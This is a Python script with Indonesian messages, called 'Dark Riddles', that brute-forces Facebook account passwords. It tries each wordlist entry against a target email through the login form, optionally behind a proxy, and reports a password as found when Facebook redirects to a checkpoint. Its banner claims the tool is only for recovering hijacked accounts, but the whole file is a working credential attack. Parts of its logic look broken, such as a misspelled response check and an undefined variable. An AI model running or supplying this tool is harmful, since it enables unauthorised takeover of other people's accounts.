import socket, os, sys, time, urllib, optparse, random
try:
    from tqdm import tqdm
except: print('\n [!] Anda tidak memiliki module tqdm. Module akan diinstall dalam 3 detik....');time.sleep(3);os.system('pip install tqdm');print(' [+] Selesai. Harap jalankan kembali tools ini');sys.exit()
try:
    import mechanize
except: print('\n [!] Anda tidak memiliki module mechanize. Module akan diinstall dalam 3 detik....');time.sleep(3);os.system('pip install mechanize');print(' [+] Selesai. Harap jalankan kembali tools ini');sys.exit()
os.system('cls||clear')
def banner(target, wordlist, prxy):
    print('''
<>=================================================<>
 |                    Dark Riddles                 |
 <=================================================>
 | Authors: RX77E                                  |
 |[INFO]: KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN |
 | YANG ANDA LAKUKAN                               |
 | TOOL'S INI HANYA DIGUNAKAN UNTUK MEREBUT KEMBALI|
 | AKUN FACEBOOK YANG DIBAJAK                      |
 +=================================================+
 |                    Rincian                      |
 ===================================================
 | Target: ''', target,''' |
 | Wordlist: ''', wordlist,''' |
 | Proxy: ''', str(prxy),''' |
 ===================================================
 |        Brute force attack dijalanakan           |
<>=================================================<>
''')

br = mechanize.Browser()
def urg():
    br.set_handle_robots(False)
    br._factory.is_html = True
    br.addheaders=[('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1.0.1.09 Safari/537.36')]

def proxy(prxy):
    print(' [~] Menyambungkan ke proxy....')
    p = urllib.request.ProxyHandler({'http' : 'https://'+str(prxy)})
    buka = urllib.request.build_opener(p)
    urllib.request.install_opener(buka)
    print('\a [*] Tersambung')

def proxymain(prxy):
    p = urllib.request.ProxyHandler({'http' : 'https://'+str(prxy)})
    buka = urllib.request.build_opener(p)
    urllib.request.install_opener(buka)
    
def login(target, p, prxy):
    urg()
    if prxy:
        proxymain(prxy)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.open('https://facebook.com')
    br.select_form(nr=0)
    br.form['email']=target
    br.form['pass']=p.strip()
    br.method ='POST'
    if br.submit().get_data().__contains__(b'empyt'): return 3
    elif "checkpoint" in br.geturl(): return 2
    return 3
def bantuan():
    banner(target, wordlist, prxy)
    print('''
python '''+sys.argv[0]+''' [OPTIONS/PERINTAH]
Perintah:
    --u --user      Gunakan ini untuk memasukkan email/nomor telepon target
    --w --wordlist  Gunakan ini untuk memasukkan path wordlist
    --hh            Gunakan ini jika ingin meminta bantuan
    --px --proxy    Gunakan ini jika ingin memakai proxy
    
Contoh Penggunaan:
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt --proxy 123.45.67:443
''');sys.exit()

menu = optparse.OptionParser('\n [?] Belum bisa menggunakan? Ketikan python '+sys.argv[0]+' --hh Untuk meminta bantuan\n')
menu.add_option('--u', '--user', dest='user')
menu.add_option('--w', '--wordlist', dest='wordlist')
menu.add_option('--hh', dest='hlp', action='store_true', default=False)
menu.add_option('--px', '--proxy', dest='proxy')

(options, args) = menu.parse_args()
target = options.user
wordlist = options.wordlist
prxy = options.proxy
hlp = options.hlp

if hlp:
    bantuan()
if wordlist:
    try:
        socket.create_connection((socket.gethostbyname('google.com'), 80), 2)
    except: print('\n [!] Harap periksa koneksi internet anda\n');sys.exit()
    banner(target, wordlist, proxy)
    if prxy:
        proxy(prxy)
    try:
        l = len(list(open(wordlist, 'rb')))
    except: 
        print('\n [!] File wordlist tidak ditemukan!')
        print('\a\a\a [#] Harap perhatikan penulisan path wordlist anda');sys.exit()
    print('\a [</>] Jumlah wordlist yang akan diuji:', l)
    with open(wordlist, 'rb') as crack:
        for p in tqdm(crack, total=l, unit='w'):
            try:
                l2 = login(target, p, prxy)
            except:
                continue
            else:
                if l2:
                    pass
                    if l2 ==2:
                        print('')
                        print('\a\a [+] Password ditemukan:', p.decode().strip())
                        print(' ')
                        print(' [!] Akun terkena checkpoint. Membutuhkan vertifikasi')
                        print(" [#] Terima kasih karena telah menggunakan tool's kami\n");sys.exit()
            
    print(' [!] Password tidak ditemukan, harap tambahkan kata baru pada file wordlist anda');sys.exit()
else:
    print(menu.usage)
